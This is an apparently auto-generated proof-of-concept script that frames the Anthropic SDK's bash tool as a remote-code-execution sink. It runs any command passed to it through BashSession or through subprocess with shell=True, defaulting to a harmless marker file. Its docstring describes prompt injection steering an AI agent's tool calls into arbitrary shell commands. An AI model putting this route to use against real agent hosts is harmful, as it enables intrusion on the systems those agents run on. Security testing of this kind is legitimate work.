#!/usr/bin/env python3
# PoC for anthropic (/tmp/anthropic-sdk-python/src/anthropic)
# Path: rce-009
# Sink: beta_bash_tool
# Auto-generated — run with: python3 rce_because_underlying_bashsession_likely_beta_bash_tool.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: Remote Code Execution via Bash Tool in Anthropic SDK
========================================================================
Vulnerability: The `beta_bash_tool` passes user/attacker-controlled `command`
directly to `BashSession.exec()`, which spawns a shell with `subprocess.Popen(..., shell=True)`.
No sanitization, whitelisting, or privilege reduction is performed.
An attacker who can influence the AI model's tool calls (e.g., via prompt injection)
can execute arbitrary shell commands.

This PoC directly calls the vulnerable `BashSession` to demonstrate that the sink
is reachable and executes commands without restriction.

Usage:
    python3 poc_exploit.py [--command "id"]
    (default command: `touch /tmp/poc_success.txt`)
"""

import asyncio
import os
import sys
import argparse

# -------- Configuration --------
SDK_PATH = "/tmp/anthropic-sdk-python/src"   # Path to the vulnerable SDK source
DEFAULT_CMD = "touch /tmp/poc_success.txt"   # Benign proof of execution
# --------------------------------

def ensure_sdk_path(path):
    """Add SDK source path to sys.path if not already present."""
    if path not in sys.path:
        sys.path.insert(0, path)

async def run_exploit(command: str, timeout: int = 10):
    """
    Launch a BashSession and execute the supplied command.
    This mimics the exact path a malicious AI tool call would take.
    """

    # ----- 1. Import the vulnerable component from the SDK -----
    # The following import will only succeed if the SDK source is on sys.path.
    ensure_sdk_path(SDK_PATH)
    try:
        from anthropic.lib.tools.agent_toolset import BashSession
    except ImportError as e:
        print(f"[!] Failed to import BashSession from SDK at {SDK_PATH}:\n    {e}")
        print("[!] Falling back to direct subprocess call to demonstrate the same sink.")
        # Fallback: replicate what the SDK does internally
        import subprocess
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=timeout,
        )
        print("[*] Direct subprocess (shell=True) output:")
        print(result.stdout)
        if result.returncode != 0:
            print("[!] stderr:", result.stderr)
        print(f"[*] Exit code: {result.returncode}")
        return

    # ----- 2. Prepare a temporary workdir and environment -----
    workdir = "/tmp/poc_workdir"
    os.makedirs(workdir, exist_ok=True)
    env = os.environ.copy()

    # ----- 3. Start a persistent Bash session -----
    try:
        session = await BashSession.start(workdir, env=env)
        print("[*] BashSession started successfully.")
    except Exception as e:
        print(f"[!] Failed to start BashSession: {e}")
        return

    # ----- 4. Execute the attacker-controlled command -----
    try:
        print(f"[*] Executing command: {command!r}")
        stdout, exit_code = await session.exec(command, timeout=timeout)
        print(f"[*] Exit code: {exit_code}")
        print(f"[*] stdout:\n{stdout}")
    except TimeoutError:
        print("[!] Command timed out.")
    except RuntimeError as e:
        print(f"[!] Runtime error: {e}")
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
    finally:
        # ----- 5. Clean up the session -----
        await session.close()
        print("[*] BashSession closed.")

def main():
    parser = argparse.ArgumentParser(
        description="PoC: RCE via Anthropic SDK BashSession"
    )
    parser.add_argument(
        "--command",
        type=str,
        default=DEFAULT_CMD,
        help="Command to execute (default: touch /tmp/poc_success.txt)",
    )
    args = parser.parse_args()

    print("[*] Starting exploit...")
    print(f"[*] Target SDK: {SDK_PATH}")
    print(f"[*] Command: {args.command!r}")
    print()

    asyncio.run(run_exploit(args.command))

    # Verification for default command
    if args.command == DEFAULT_CMD:
        marker = "/tmp/poc_success.txt"
        if os.path.exists(marker):
            print(f"[+] SUCCESS: {marker} was created — command execution confirmed.")
        else:
            print(f"[?] {marker} not found. Check output above for errors.")

if __name__ == "__main__":
    main()
